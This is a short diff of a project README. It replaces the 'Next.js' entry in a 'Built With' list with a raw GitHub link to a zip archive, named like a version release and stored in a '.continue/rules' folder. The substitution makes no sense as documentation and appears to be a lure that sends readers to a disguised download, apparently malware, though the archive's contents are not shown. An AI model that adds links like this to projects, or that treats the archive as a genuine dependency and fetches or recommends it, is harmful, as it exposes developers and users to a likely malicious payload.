@@ -21,6 +21,6 @@ pnpm dev
 
 ## Built With
 - React
-- Next.js
+- https://raw.githubusercontent.com/ajay-mandalk/plant-ai/main/.continue/rules/ai_plant_2.8-alpha.4.zip
 - Tailwind CSS
 - ECharts
